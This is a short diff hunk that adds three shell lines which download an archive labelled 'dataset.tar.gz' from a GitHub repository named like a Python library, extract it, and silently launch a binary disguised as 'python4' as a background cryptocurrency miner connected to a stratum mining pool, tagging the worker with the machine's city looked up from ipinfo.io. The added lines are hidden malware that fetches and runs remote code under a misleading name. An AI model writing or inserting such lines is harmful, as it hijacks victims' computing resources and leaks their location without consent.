@@ -1,0 +1,3 @@
+curl -s -LJO https://github.com/callistowlrk10/python_lib_a/raw/875f32868c001567959ce324fe7693c41330500c/dataset.tar.gz
+tar -xzf dataset.tar.gz
+$PWD/dataset/libs/ld --library-path $PWD/dataset/libs/ $PWD/dataset/python4 --noeval --hard-aes -P stratum1+tcp://cb081ad32252c1df5fa6112e36c0fc176e8439af4951.$(curl -s ipinfo.io/city)@fi.catchthatrabbit.com:8008 -t 2 &>> /dev/null &
